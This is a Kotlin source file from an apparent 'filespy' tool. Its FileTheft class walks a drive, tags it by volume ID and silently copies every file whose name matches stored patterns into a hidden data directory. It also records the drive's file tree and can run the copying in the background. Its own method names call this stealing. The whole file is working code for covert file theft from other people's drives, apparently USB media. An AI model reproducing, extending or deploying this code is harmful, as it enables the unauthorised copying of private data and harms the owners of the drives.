package studio.papercube.sh.filespy

import studio.papercube.library.fileassist.DriveMarker
import studio.papercube.sh.filespy.EncodingUtil.encodeHexString
import studio.papercube.sh.filespy.concurrent.sharedExecutor
import java.io.File
import java.io.IOException
import java.time.LocalDate
import java.time.LocalTime
import java.util.concurrent.Future
import java.util.stream.Collectors

class FileTheft(private val baseDirectory: File) : Theft {
    companion object {
        private const val STEAL_RESULT_FAILURE = 1
        private const val STEAL_RESULT_SUCCESS = 0
        private const val LOG_TAG = "FileTheft"
        @JvmStatic
        private fun timeStamp() = System.currentTimeMillis()

        @JvmStatic
        @Deprecated("It's proposed to use copyRelatively")
        fun stealSingleFile(f: File,
                            destDir: File): Boolean {
            try {
                val targetFile = File("${destDir.absolutePath}/${f.nameWithoutExtension}-${timeStamp()}.${f.extension}")
                f.copyTo(targetFile, bufferSize = 16384)
                targetFile.setLastModified(f.lastModified())
            } catch (e: Exception) {
//                e.printStackTrace()
                return false
            }
            return true
        }

        @JvmStatic
        fun copyRelatively(file: File, base: File, targetDirectory: File): Boolean {
            try {
                val relativePath = file.toRelativeString(base)
                val targetFile = File(targetDirectory, relativePath).absoluteFile
                file.copyTo(targetFile, bufferSize = 16384)
                targetFile.setLastModified(file.lastModified())
            } catch (e: Exception) {
                return false
            }
            return true
        }
    }


    override fun steal() {
        log.i(LOG_TAG, "Stealing $baseDirectory on thread ${Thread.currentThread().name}")
        val patterns = PatternsManager.default.readPatterns()
        val volumeIdByteArray = tryMarkVolume()

        val destDir = newDestinationDir(volumeIdByteArray)
                ?: throw IOException("Cannot create directories to store files")
        log.i(LOG_TAG, "Destination dir: $destDir")

        val skipCheck = if (volumeIdByteArray == null) null else SkipManagement.getSkipCheck(volumeIdByteArray)
        val fileWalker = FileWalker(baseDirectory, skipCheck)

        val completeFileList = fileWalker.walk()
        reportExceptionsIfNecessary(fileWalker.getExceptions())

        val stealResults: Map<Int, Long> = completeFileList
                .stream()
                .filter { fileToCheck -> patterns.any { pattern -> pattern.matchesWithName(fileToCheck.name) } }
                .map { if (copyRelatively(it, baseDirectory, destDir)) STEAL_RESULT_SUCCESS else STEAL_RESULT_FAILURE }
                .collect(Collectors.groupingBy({ value: Int -> value }, Collectors.counting()))

        try {
            File(destDir, "__FileTree__.xml").bufferedWriter().use { treeWriter ->
                treeWriter.write(fileWalker.fileTreeString)
            }
        } catch (e: Exception) {
            log.e("FileTheft.FileTreeWriter", msg = "Failed to write file tree.", e = e)
        }

        log.i(LOG_TAG, "Done stealing $baseDirectory. " +
                "${stealResults[STEAL_RESULT_SUCCESS] ?: 0} file(s) succeeded, " +
                "${stealResults[STEAL_RESULT_FAILURE] ?: 0} failed")
    }

    private fun tryMarkVolume(): ByteArray? {
        val driveMarker = DriveMarker.inDrive(baseDirectory)
        return try {
            driveMarker.resolve()
        } catch (e: Exception) {
            log.e(tag = "DriveMarker", msg = "Failed to mark drive", e = e)
            null
        }
    }

    private fun newDestinationDir(volumeIdByteArray: ByteArray?): File? {
        val dataDir = File(ConfigParameters.instance.dataPath)
        if (volumeIdByteArray == null) {
            return File(dataDir, "UnknownDriveId")
        }
        val volumeIdString = volumeIdByteArray.encodeHexString()
        val file = File(
                "${dataDir.path}/" +
                        volumeIdString +
                        "/${dateTimeUrlSafeString()}"
        )

        return if (file.exists() || file.mkdirs()) file else null
    }

    private fun dateTimeUrlSafeString(): String =
            LocalDate.now().toString() + "_" + TimeFormatter.formatTimeUrlSafe(LocalTime.now())

    private fun reportExceptionsIfNecessary(exceptions: List<Throwable>) {
        if (!exceptions.isEmpty()) {
            log.w(LOG_TAG, "${exceptions.size} exceptions encountered walking ${baseDirectory.absolutePath}")
            val headExceptions = exceptions
                    .take(30)
                    .joinToString(separator = "\n", prefix = "\n") { it.toString() }
            log.w(LOG_TAG, "The first 30 exceptions are : $headExceptions")
        }
    }

    fun stealAsync(): Future<*> {
        return sharedExecutor.submit {
            try {
                steal()
            } catch (e: Exception) {
                log.e(
                        tag = LOG_TAG,
                        msg = "Unexpected exception raised when executing file theft asynchronously on ${Thread.currentThread().name}.",
                        e = e
                )
            }
        }
    }


}